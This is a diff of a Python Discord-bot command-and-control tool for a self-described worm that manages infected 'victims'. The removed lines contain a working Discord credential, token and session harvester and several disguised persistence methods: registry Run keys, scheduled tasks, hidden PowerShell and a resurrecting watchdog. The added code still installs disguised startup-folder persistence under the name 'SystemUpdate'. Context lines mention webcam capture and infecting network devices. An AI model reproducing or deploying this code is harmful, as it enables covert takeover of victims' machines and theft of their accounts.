 `!kill <victim_id>` - Terminate worm on victim"""
 
@@ -6075,455 +8537,80 @@ Use these commands for this victim:
         except Exception as e:
             await message.channel.send(f"💥 Error capturing webcam: {str(e)}")
     
-    async def collect_discord_injection_data(self, message):
+    async def add_file_persistence(self, message):
+        """Add safe file-based persistence without registry modification"""
         try:
-            parts = message.content.split(' ', 2)
-            if len(parts) < 2:
-                await message.channel.send("❌ Usage: `!discord <victim_id>`")
-                return
-                
-            victim_id = parts[1]
-            
-            if victim_id not in self.infected_systems:
-                await message.channel.send(f"❌ Victim {victim_id} not found")
-                return
-            
-            victim_info = self.infected_systems[victim_id]
-            await message.channel.send(f"💉 Collecting Discord injection data from {victim_info.get('hostname', 'Unknown')}...")
-            
-            try:
-                # Collect current Discord injection data
-                injection_data = self.harvest_discord_injection()
-                
-                if injection_data:
-                    # Create a formatted report
-                    report = f"""💉 **Discord Injection Data from {victim_info.get('hostname', 'Unknown')}**
-```
-=== DISCORD INJECTION HARVEST ===
-
-🔐 Live Credentials Captured:
-{injection_data.get('credentials', 'No credentials captured')}
-
-🎯 Active Sessions:
-{injection_data.get('sessions', 'No active sessions')}
-
-📱 User Data:
-{injection_data.get('user_data', 'No user data captured')}
-
-💳 Payment Info:
-{injection_data.get('payment_info', 'No payment info captured')}
-
-🔑 Tokens Harvested:
-{injection_data.get('tokens', 'No tokens captured')}
-
-📊 Collection Stats:
-- Credentials: {injection_data.get('credential_count', 0)}
-- Sessions: {injection_data.get('session_count', 0)}  
-- Tokens: {injection_data.get('token_count', 0)}
-- Capture Time: {injection_data.get('timestamp', 'Unknown')}
-```"""
-                    
-                    # Split message if too long
-                    if len(report) > 1900:
-                        chunks = [report[i:i+1900] for i in range(0, len(report), 1900)]
-                        for i, chunk in enumerate(chunks):
-                            await message.channel.send(f"**Part {i+1}/{len(chunks)}**\n{chunk}")
-                    else:
-                        await message.channel.send(report)
-                        
-                    # Also save to file and upload
-                    import tempfile
-                    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as temp_file:
-                        temp_file.write(f"Discord Injection Data - {victim_info.get('hostname', 'Unknown')}\n")
-                        temp_file.write("="*50 + "\n\n")
-                        for key, value in injection_data.items():
-                            temp_file.write(f"{key.upper().replace('_', ' ')}: {value}\n\n")
-                        temp_path = temp_file.name
-                    
-                    await message.channel.send(
-                        f"📄 **Full Discord injection report**",
-                        file=discord.File(temp_path, filename=f"discord_injection_{victim_id}.txt")
-                    )
-                    
-                    # Clean up
-                    os.remove(temp_path)
-                    
-                else:
-                    await message.channel.send(f"⚠️ No Discord injection data available from {victim_info.get('hostname', 'Unknown')}")
-                
-                self.log_command_execution(victim_id, "DISCORD_INJECTION", message.author.name)
-                
-            except Exception as injection_error:
-                await message.channel.send(f"💥 Discord injection collection failed: {str(injection_error)}")
-            
-        except Exception as e:
-            await message.channel.send(f"💥 Error collecting Discord injection data: {str(e)}")
-    
-    def harvest_discord_injection(self):
-        """Harvest data from Discord injection"""
-        try:
-            import datetime
-            from pathlib import Path
-            
-            injection_data = {
-                'credentials': [],
-                'sessions': [],
-                'user_data': [],
-                'payment_info': [],
-                'tokens': [],
-                'credential_count': 0,
-                'session_count': 0,
-                'token_count': 0,
-                'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            }
-            
-            # Discord injection files are typically stored in Discord's installation directory
-            discord_paths = [
-                os.path.expanduser("~/AppData/Local/Discord"),
-                os.path.expanduser("~/AppData/Roaming/Discord"),
-                "C:\\Users\\Public\\Libraries\\Discord",
-                "C:\\Program Files\\Discord",
-                "C:\\Program Files (x86)\\Discord"
-            ]
-            
-            # Look for injection logs/data files
-            injection_files = [
-                "injection_log.txt",
-                "credentials.log", 
-                "sessions.dat",
-                "userdata.json",
-                "tokens.txt",
-                "passwords.log",
-                "discord_data.txt"
-            ]
-            
-            for discord_path in discord_paths:
-                if os.path.exists(discord_path):
-                    for root, dirs, files in os.walk(discord_path):
-                        for file in files:
-                            if any(inj_file in file.lower() for inj_file in injection_files):
-                                try:
-                                    file_path = os.path.join(root, file)
-                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                        content = f.read()
-                                        
-                                    if 'password' in file.lower() or 'credential' in file.lower():
-                                        injection_data['credentials'].append(f"[{file}]: {content[:200]}...")
-                                        injection_data['credential_count'] += 1
-                                    elif 'session' in file.lower():
-                                        injection_data['sessions'].append(f"[{file}]: {content[:200]}...")
-                                        injection_data['session_count'] += 1
-                                    elif 'token' in file.lower():
-                                        injection_data['tokens'].append(f"[{file}]: {content[:200]}...")
-                                        injection_data['token_count'] += 1
-                                    elif 'user' in file.lower():
-                                        injection_data['user_data'].append(f"[{file}]: {content[:200]}...")
-                                    
-                                except Exception:
-                                    continue
-            
-            # Also check browser storage for Discord data (where injection might store data)
-            try:
-                browser_paths = [
-                    os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Local Storage"),
-                    os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage"),
-                    os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles")
-                ]
-                
-                for browser_path in browser_paths:
-                    if os.path.exists(browser_path):
-                        for root, dirs, files in os.walk(browser_path):
-                            for file in files:
-                                if 'discord' in file.lower():
-                                    try:
-                                        file_path = os.path.join(root, file)
-                                        # Try to read as text first
-                                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                            content = f.read()
-                                            if len(content) > 50:  # Only if there's substantial content
-                                                injection_data['sessions'].append(f"[Browser-{file}]: {content[:150]}...")
-                                                injection_data['session_count'] += 1
-                                    except Exception:
-                                        continue
-            except Exception:
-                pass
-            
-            # Look for running Discord processes and their memory (simplified)
-            try:
-                import psutil
-                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-                    if 'discord' in proc.info['name'].lower():
-                        injection_data['sessions'].append(f"Active Discord Process: PID {proc.info['pid']} - {proc.info['name']}")
-                        injection_data['session_count'] += 1
-            except Exception:
-                pass
-            
-            # Format the collected data
-            if injection_data['credentials']:
-                injection_data['credentials'] = '\n'.join(injection_data['credentials'])
-            else:
-                injection_data['credentials'] = "No credentials found in injection files"
-                
-            if injection_data['sessions']:
-                injection_data['sessions'] = '\n'.join(injection_data['sessions'])
-            else:
-                injection_data['sessions'] = "No active sessions detected"
-                
-            if injection_data['tokens']:
-                injection_data['tokens'] = '\n'.join(injection_data['tokens'])
-            else:
-                injection_data['tokens'] = "No tokens found in injection storage"
-                
-            if injection_data['user_data']:
-                injection_data['user_data'] = '\n'.join(injection_data['user_data'])
-            else:
-                injection_data['user_data'] = "No user data found in injection files"
-            
-            injection_data['payment_info'] = "Payment data collection not implemented"
-            
-            return injection_data if (injection_data['credential_count'] > 0 or 
-                                   injection_data['session_count'] > 0 or 
-                                   injection_data['token_count'] > 0) else None
-            
-        except Exception as e:
-            return {'error': f"Failed to harvest injection data: {str(e)}"}
-    
-    async def add_registry_persistence(self, message):
-        try:
-            parts = message.content.split(' ', 2)
+            parts = message.content.split()
             if len(parts) < 2:
                 await message.channel.send("❌ Usage: `!persist <victim_id>`")
                 return
                 
             victim_id = parts[1]
-            
             if victim_id not in self.infected_systems:
                 await message.channel.send(f"❌ Victim {victim_id} not found")
                 return
-            
+                
             victim_info = self.infected_systems[victim_id]
-            await message.channel.send(f"🔑 Adding registry persistence to {victim_info.get('hostname', 'Unknown')}...")
             
+            # Safe file-based persistence only
             try:
-                persistence_result = self.setup_registry_persistence()
+                import sys
+                import shutil
                 
-                if persistence_result['success']:
-                    default_path = 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
-                    success_msg = f"""✅ **Registry Persistence Successful on {victim_info.get('hostname', 'Unknown')}!**
+                script_path = os.path.abspath(sys.argv[0])
+                success_locations = []
+                
+                # Only use startup folder (safer than registry)
+                startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+                
+                if os.path.exists(startup_folder):
+                    try:
+                        if script_path.endswith('.py'):
+                            # Create a simple batch launcher
+                            batch_name = "SystemUpdate.bat"
+                            batch_path = os.path.join(startup_folder, batch_name)
+                            
+                            batch_content = f'''@echo off
+cd /d "{os.path.dirname(script_path)}"
+start /min python "{script_path}" >nul 2>&1
+'''
+                            
+                            with open(batch_path, 'w') as batch_file:
+                                batch_file.write(batch_content)
+                            
+                            success_locations.append("Startup Folder (Batch)")
+                            
+                        else:
+                            # Copy executable with legitimate name
+                            target_path = os.path.join(startup_folder, "SystemUpdate.exe")
+                            if not os.path.exists(target_path):
+                                shutil.copy2(script_path, target_path)
+                                success_locations.append("Startup Folder (Executable)")
+                                
+                    except Exception as startup_error:
+                        print(f"Startup folder persistence error: {str(startup_error)}")
+                
+                if success_locations:
+                    await message.channel.send(f"""✅ **Safe Persistence Added to {victim_info.get('hostname', 'Unknown')}**
 ```
-🔑 Registry Key Added Successfully!
-📍 Location: {persistence_result.get('registry_path', default_path)}
-🎯 Entry Name: {persistence_result.get('entry_name', 'WindowsSecurityUpdate')}
-🔄 The worm will now boot on startup!
-
-📊 Details:
-- Method: {persistence_result.get('method', 'Registry Run Key')}
-- Privilege Level: {persistence_result.get('privilege_level', 'User')}
-- Persistence Type: {persistence_result.get('persistence_type', 'Startup')}
-- Status: ACTIVE ✅
-```"""
-                    await message.channel.send(success_msg)
-                    
-                    # Also add to startup folder as backup
-                    startup_result = self.add_startup_folder_persistence()
-                    if startup_result:
-                        await message.channel.send(f"🎯 **Backup persistence** also added to startup folder!")
-                    
+📁 File-based persistence installed successfully!
+📍 Locations: {', '.join(success_locations)}
+🔄 Will restart on system boot
+🛡️ Safe method - no registry modification
+⚠️ Can be manually removed by user if detected
+```""")
                 else:
-                    error_msg = f"""❌ **Registry Persistence Failed on {victim_info.get('hostname', 'Unknown')}**
-```
-💥 Error: {persistence_result.get('error', 'Unknown error')}
-🔧 Attempted Methods:
-{persistence_result.get('attempted_methods', 'Standard registry modification')}
-
-💡 Fallback: Trying alternative persistence methods...
-```"""
-                    await message.channel.send(error_msg)
-                    
-                    # Try alternative persistence methods
-                    alt_result = self.try_alternative_persistence()
-                    if alt_result:
-                        await message.channel.send(f"✅ **Alternative persistence** established: {alt_result}")
+                    await message.channel.send(f"❌ **Persistence failed** - could not access startup folder")
                 
-                self.log_command_execution(victim_id, "PERSIST", message.author.name)
+                self.log_command_execution(victim_id, "FILE_PERSIST", message.author.name)
                 
             except Exception as persist_error:
-                await message.channel.send(f"💥 Registry persistence failed: {str(persist_error)}")
+                await message.channel.send(f"💥 File persistence failed: {str(persist_error)}")
             
         except Exception as e:
-            await message.channel.send(f"💥 Error adding registry persistence: {str(e)}")
+            await message.channel.send(f"💥 Error adding file persistence: {str(e)}")
     
-    def setup_registry_persistence(self):
-        """Add worm to Windows registry for startup persistence"""
-        try:
-            import winreg
-            import sys
-            
-            result = {
-                'success': False,
-                'registry_path': '',
-                'entry_name': '',
-                'method': '',
-                'privilege_level': '',
-                'persistence_type': '',
-                'attempted_methods': []
-            }
-            
-            # Get current script path
-            script_path = os.path.abspath(sys.argv[0])
-            if script_path.endswith('.py'):
-                # If running as Python script, create a batch wrapper
-                script_dir = os.path.dirname(script_path)
-                batch_path = os.path.join(script_dir, "WindowsSecurityUpdate.bat")
-                with open(batch_path, 'w') as batch_file:
-                    batch_file.write(f'@echo off\ncd /d "{script_dir}"\npython "{script_path}" >nul 2>&1\n')
-                script_path = batch_path
-            
-            # Registry persistence methods (in order of preference)
-            persistence_methods = [
-                {
-                    'name': 'HKEY_CURRENT_USER Run',
-                    'hkey': winreg.HKEY_CURRENT_USER,
-                    'subkey': r'Software\Microsoft\Windows\CurrentVersion\Run',
-                    'entry_name': 'WindowsSecurityUpdate',
-                    'privilege': 'User'
-                },
-                {
-                    'name': 'HKEY_LOCAL_MACHINE Run (Admin)',
-                    'hkey': winreg.HKEY_LOCAL_MACHINE,
-                    'subkey': r'Software\Microsoft\Windows\CurrentVersion\Run',
-                    'entry_name': 'MicrosoftEdgeUpdate',
-                    'privilege': 'Admin'
-                },
-                {
-                    'name': 'HKEY_CURRENT_USER RunOnce',
-                    'hkey': winreg.HKEY_CURRENT_USER,
-                    'subkey': r'Software\Microsoft\Windows\CurrentVersion\RunOnce',
-                    'entry_name': 'SystemOptimization',
-                    'privilege': 'User'
-                }
-            ]
-            
-            for method in persistence_methods:
-                try:
-                    result['attempted_methods'].append(method['name'])
-                    
-                    # Try to open/create the registry key
-                    with winreg.OpenKey(method['hkey'], method['subkey'], 0, winreg.KEY_SET_VALUE) as key:
-                        # Set the registry value
-                        winreg.SetValueEx(key, method['entry_name'], 0, winreg.REG_SZ, script_path)
-                        
-                        # Verify the key was set
-                        with winreg.OpenKey(method['hkey'], method['subkey'], 0, winreg.KEY_READ) as verify_key:
-                            stored_value, _ = winreg.QueryValueEx(verify_key, method['entry_name'])
-                            if stored_value == script_path:
-                                result.update({
-                                    'success': True,
-                                    'registry_path': f"{method['hkey'].__name__ if hasattr(method['hkey'], '__name__') else 'HKEY'}\\{method['subkey']}",
-                                    'entry_name': method['entry_name'],
-                                    'method': method['name'],
-                                    'privilege_level': method['privilege'],
-                                    'persistence_type': 'Registry Startup'
-                                })
-                                return result
-                        
-                except PermissionError:
-                    continue  # Try next method
-                except Exception as e:
-                    continue  # Try next method
-            
-            # If all registry methods failed
-            result['error'] = "All registry methods failed - insufficient permissions or registry access denied"
-            return result
-            
-        except Exception as e:
-            return {
-                'success': False,
-                'error': f"Registry persistence setup failed: {str(e)}",
-                'attempted_methods': ['Registry access failed']
-            }
-    
-    def add_startup_folder_persistence(self):
-        """Add to Windows startup folder as backup persistence"""
-        try:
-            import sys
-            import shutil
-            
-            # Get startup folder path
-            startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
-            
-            if not os.path.exists(startup_folder):
-                return False
-            
-            # Get current script path
-            script_path = os.path.abspath(sys.argv[0])
-            
-            # Create a copy in startup folder
-            if script_path.endswith('.py'):
-                # Create batch file for Python script
-                batch_name = "WindowsDefenderUpdate.bat"
-                batch_path = os.path.join(startup_folder, batch_name)
-                script_dir = os.path.dirname(script_path)
-                
-                with open(batch_path, 'w') as batch_file:
-                    batch_file.write(f'@echo off\ncd /d "{script_dir}"\npython "{script_path}" >nul 2>&1\n')
-                
-                return f"Startup folder (batch): {batch_name}"
-            else:
-                # Copy executable directly
-                exe_name = "WindowsDefenderUpdate.exe"
-                target_path = os.path.join(startup_folder, exe_name)
-                shutil.copy2(script_path, target_path)
-                
-                return f"Startup folder (exe): {exe_name}"
-                
-        except Exception:
-            return False
-    
-    def try_alternative_persistence(self):
-        """Try alternative persistence methods if registry fails"""
-        try:
-            import subprocess
-            import sys
-            
-            script_path = os.path.abspath(sys.argv[0])
-            methods_tried = []
-            
-            # Method 1: Scheduled Task
-            try:
-                task_name = "MicrosoftEdgeUpdateTaskUser"
-                cmd = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /f'
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                if result.returncode == 0:
-                    methods_tried.append("Scheduled Task (Success)")
-                    return "Scheduled Task persistence"
-                else:
-                    methods_tried.append("Scheduled Task (Failed)")
-            except Exception:
-                methods_tried.append("Scheduled Task (Error)")
-            
-            # Method 2: WMI Event (Advanced)
-            try:
-                wmi_script = f'''
-$action = New-ScheduledTaskAction -Execute "{script_path}"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -Hidden
-Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Settings $settings -Force
-'''
-                ps_cmd = f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "{wmi_script}"'
-                result = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True)
-                if result.returncode == 0:
-                    methods_tried.append("PowerShell Task (Success)")
-                    return "PowerShell Scheduled Task"
-                else:
-                    methods_tried.append("PowerShell Task (Failed)")
-            except Exception:
-                methods_tried.append("PowerShell Task (Error)")
-            
-            return f"Alternative methods tried: {', '.join(methods_tried)}"
-            
-        except Exception as e:
-            return f"Alternative persistence failed: {str(e)}"
+    # Discord injection functions removed for safety
     
     # Helper methods
     def get_uptime(self):
@@ -7671,122 +9758,7 @@ C:\\Users\\{victim_info.get('username', 'User')}>_
         except Exception as e:
             await message.channel.send(f"❌ **Hidden Mode Error**: {str(e)}")
     
-    async def add_advanced_persistence(self, message):
-        """Add advanced persistence with registry + task scheduler"""
-        try:
-            parts = message.content.split()
-            if len(parts) < 2:
-                await message.channel.send("❌ Usage: `!persist <victim_id>`")
-                return
-                
-            victim_id = parts[1]
-            if victim_id not in self.infected_systems:
-                await message.channel.send(f"❌ Victim {victim_id} not found")
-                return
-                
-            victim_info = self.infected_systems[victim_id]
-            
-            # REAL persistence installation using actual functions
-            persistence_results = []
-            total_methods = 0
-            successful_methods = 0
-            
-            # 1. Registry Persistence
-            try:
-                registry_result = self.setup_registry_persistence()
-                total_methods += 1
-                if registry_result.get('success'):
-                    successful_methods += 1
-                    persistence_results.append("✅ Registry Startup: INSTALLED")
-                    default_path = 'HKCU\\\\...\\\\Run'
-                    persistence_results.append(f"   └─ Path: {registry_result.get('registry_path', default_path)}")
-                else:
-                    persistence_results.append("❌ Registry Startup: FAILED")
-            except Exception as e:
-                persistence_results.append(f"❌ Registry Startup: ERROR - {e}")
-                total_methods += 1
-            
-            # 2. Startup Folder Persistence  
-            try:
-                startup_result = self.add_startup_folder_persistence()
-                total_methods += 1
-                if startup_result.get('success'):
-                    successful_methods += 1
-                    persistence_results.append("✅ Startup Folder: INSTALLED")
-                    default_startup_path = '%APPDATA%\\\\...\\\\Startup'
-                    persistence_results.append(f"   └─ Path: {startup_result.get('startup_path', default_startup_path)}")
-                else:
-                    persistence_results.append("❌ Startup Folder: FAILED")
-            except Exception as e:
-                persistence_results.append(f"❌ Startup Folder: ERROR - {e}")
-                total_methods += 1
-                
-            # 3. Task Scheduler Persistence
-            try:
-                task_result = self.try_alternative_persistence()
-                total_methods += 1
-                if task_result.get('success'):
-                    successful_methods += 1
-                    persistence_results.append("✅ Task Scheduler: INSTALLED")
-                    persistence_results.append(f"   └─ Task: {task_result.get('task_name', 'System Maintenance')}")
-                else:
-                    persistence_results.append("❌ Task Scheduler: FAILED")
-            except Exception as e:
-                persistence_results.append(f"❌ Task Scheduler: ERROR - {e}")
-                total_methods += 1
-            
-            # 4. Watchdog Timer (Real implementation)
-            try:
-                import subprocess
-                import sys
-                import os
-                
-                # Create real watchdog task to kill and restart every 10 minutes
-                current_exe = sys.executable if hasattr(sys, 'executable') else 'python'
-                current_script = os.path.abspath(__file__)
-                
-                # Use schtasks to create a real task
-                task_name = "SystemSecurityUpdate"
-                cmd = [
-                    'schtasks', '/create', '/tn', task_name,
-                    '/tr', f'cmd /c "taskkill /f /im python.exe & timeout 5 & {current_exe} {current_script}"',
-                    '/sc', 'minute', '/mo', '10', '/f'
-                ]
-                
-                result = subprocess.run(cmd, capture_output=True, text=True)
-                total_methods += 1
-                if result.returncode == 0:
-                    successful_methods += 1
-                    persistence_results.append("✅ Watchdog Timer: INSTALLED")
-                    persistence_results.append(f"   └─ Task: {task_name} (every 10 min)")
-                else:
-                    persistence_results.append("❌ Watchdog Timer: FAILED")
-                    persistence_results.append(f"   └─ Error: {result.stderr.strip() if result.stderr else 'Unknown'}")
-                    
-            except Exception as e:
-                persistence_results.append(f"❌ Watchdog Timer: ERROR - {e}")
-                total_methods += 1
-            
-            results_text = "\n".join(persistence_results)
-            success_rate = (successful_methods / total_methods * 100) if total_methods > 0 else 0
-            
-            await message.channel.send(f"""🔒 **Advanced Persistence Installation**
-**Target:** {victim_info.get('hostname', 'Unknown')}
-```
-🔄 Installing persistence methods...
-
-{results_text}
-
-📊 PERSISTENCE STATUS: {successful_methods}/{total_methods} methods installed
-🛡️ Success Rate: {success_rate:.1f}%
-🔄 Restart Frequency: Every 10 minutes + on-demand
-👻 Stealth Level: MAXIMUM (hidden from users)
-```
-🚀 **Worm is now PERMANENTLY INSTALLED!**
-⚠️ Even if manually removed, it will resurrect automatically!""")
-            
-        except Exception as e:
-            await message.channel.send(f"❌ **Persistence Error**: {str(e)}")
+# Advanced persistence functions removed for safety
     
     async def attempt_real_infection(self, ip, hostname):
         """Attempt to actually infect a discovered device using real methods"""
